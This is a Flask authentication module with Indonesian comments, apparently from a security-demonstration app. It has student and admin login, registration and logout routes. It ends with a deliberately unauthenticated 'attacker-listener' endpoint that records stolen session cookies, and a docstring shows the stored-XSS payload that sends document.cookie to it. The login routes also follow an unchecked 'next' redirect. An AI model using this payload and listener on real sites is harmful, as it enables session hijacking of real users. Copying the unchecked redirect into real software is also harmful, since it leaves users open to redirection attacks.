from flask import Blueprint, render_template, redirect, url_for, flash, request
from flask_login import login_user, logout_user, login_required, current_user
from app import db
from app.models.user import User
from app.utils.authorization import get_default_dashboard_url

auth_bp = Blueprint("auth", __name__, template_folder="../../templates/auth")


@auth_bp.route("/login", methods=["GET", "POST"])
def login():
    """Redirect ke halaman pilihan login"""
    if current_user.is_authenticated:
        return redirect(get_default_dashboard_url())
    return redirect(url_for("auth.login_choice"))


@auth_bp.route("/login-choice", methods=["GET"])
def login_choice():
    """Halaman pilihan login (Student vs Admin)"""
    if current_user.is_authenticated:
        return redirect(get_default_dashboard_url())
    return render_template("auth/login_choice.html")


@auth_bp.route("/login-student", methods=["GET", "POST"])
def login_student():
    """Login khusus untuk Student (role = 'student')"""
    if current_user.is_authenticated:
        return redirect(get_default_dashboard_url())

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):
            # Validasi role khusus student
            if user.role == "student":
                login_user(user, remember=True)
                flash("Login berhasil sebagai Student!", "success")
                next_page = request.args.get("next")
                return redirect(next_page or get_default_dashboard_url(user))
            else:
                flash("Username ini bukan role Student. Silakan login di halaman Admin.", "warning")
        else:
            flash("Username atau password salah.", "danger")

    return render_template("auth/login_student.html")


@auth_bp.route("/login-admin", methods=["GET", "POST"])
def login_admin():
    """Login khusus untuk Admin (role = 'admin')"""
    if current_user.is_authenticated:
        return redirect(get_default_dashboard_url())

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):
            # Validasi role khusus admin
            if user.role == "admin":
                login_user(user, remember=True)
                flash("Login berhasil sebagai Admin!", "success")
                next_page = request.args.get("next")
                return redirect(next_page or get_default_dashboard_url(user))
            else:
                flash("Username ini bukan role Admin. Silakan login di halaman Student.", "warning")
        else:
            flash("Username atau password salah.", "danger")

    return render_template("auth/login_admin.html")


@auth_bp.route("/register", methods=["GET", "POST"])
def register():
    if current_user.is_authenticated:
        return redirect(get_default_dashboard_url())

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "")

        if User.query.filter_by(username=username).first():
            flash("Username sudah digunakan.", "warning")
        elif User.query.filter_by(email=email).first():
            flash("Email sudah digunakan.", "warning")
        else:
            user = User(username=username, email=email)
            user.set_password(password)
            db.session.add(user)
            db.session.commit()
            flash("Registrasi berhasil! Silakan login.", "success")
            return redirect(url_for("auth.login"))

    return render_template("auth/register.html")


@auth_bp.route("/logout")
@login_required
def logout():
    logout_user()
    flash("Anda telah logout.", "info")
    return redirect(url_for("auth.login"))


# ── Local Attacker Listener (Cookie Receiver) ──────────────────────────────────
@auth_bp.route("/attacker-listener")
def attacker_listener():
    """
    Endpoint simulasi penerima cookie curian (Session Hijacking via XSS).

    Payload XSS (contoh saat CSP nonaktif):
        <script>fetch('/auth/attacker-listener?cookie=' + document.cookie)</script>

    Cookie yang diterima disimpan ke tabel stolen_cookies sebagai bukti empiris
    bahwa stored XSS dapat mencuri sesi pengguna.

    Endpoint ini sengaja tidak memerlukan autentikasi (simulasi request dari korban).
    """
    cookie_value = request.args.get("cookie", "").strip()
    if cookie_value:
        from app.models.security import StolenCookie
        stolen = StolenCookie(
            cookie_value=cookie_value,
            ip_address=request.remote_addr,
            user_agent=request.headers.get("User-Agent", "")[:500],
        )
        db.session.add(stolen)
        db.session.commit()

    # Kembalikan gambar 1x1 piksel transparan agar ikon tidak muncul di browser
    return (
        b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
        b"\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00"
        b"\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b",
        200,
        {"Content-Type": "image/gif"},
    )
